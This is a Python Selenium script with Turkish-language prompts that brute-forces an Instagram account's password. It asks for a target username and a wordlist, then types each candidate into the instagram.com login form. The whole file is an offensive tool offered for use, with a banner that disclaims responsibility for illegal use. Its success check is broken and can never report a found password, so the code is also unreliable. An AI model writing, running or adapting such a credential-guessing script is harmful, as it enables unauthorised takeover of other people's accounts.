from selenium import webdriver
import time
import sys
from pynput.keyboard import Key, Controller
from selenium.webdriver.common import proxy
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from colorama import init
from termcolor import colored


print(colored('''

.___                 __        __________                __          
|   | ____   _______/  |______ \______   \_______ __ ___/  |_  ____  
|   |/    \ /  ___/\   __\__  \ |    |  _/\_  __ \  |  \   __\/ __ \ 
|   |   |  \\___ \  |  |  / __ \|    |   \ |  | \/  |  /|  | \  ___/ 
|___|___|  /____  > |__| (____  /______  / |__|  |____/ |__|  \___  >
         \/     \/            \/       \/                         \/ 


AUTHOR : Mizard-sys
DANGER : Yaptığınız Legal/İllegal İşlemler Kendi İradeniz Doğrultusunda Yapılmıştır.\n
INFORMATION : proxy will be added in future versions
''','green'))

animation = "|/-\\ "
for i in range(20):
    time.sleep(0.1)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()


nickname = input(colored("\n[+] Kullanıcı Adı : ",'red'))
worldlist = input(colored("[+] WorldListinizin Adı : ",'red'))

print("BruteForce Başliyor...")


browser = webdriver.Chrome(ChromeDriverManager().install())
browser.get("https://www.instagram.com") 
time.sleep(5)

username = browser.find_element(By.XPATH,"//*[@id='loginForm']/div/div[1]/div/label/input") 
password = browser.find_element(By.XPATH,"//*[@id='loginForm']/div/div[2]/div/label/input") 
login    = browser.find_element(By.XPATH,"//*[@id='loginForm']/div/div[3]/button")

files = open(f'{worldlist}.txt', "r") 

username.send_keys(f'{nickname}') 
for satir in files:
    password.send_keys(satir)
    time.sleep(2)
    login.click()
    time.sleep(3) 
    password.send_keys(Keys.BACK_SPACE * 20)
    print("[+] Denenen Şifreler = \n{}".format(satir))
    if satir == True:
        print(f'Doğru Şifre {password}')
    time.sleep(5) 


time.sleep(20) 
browser.close() 
print("Bruteforce Sonlandı")
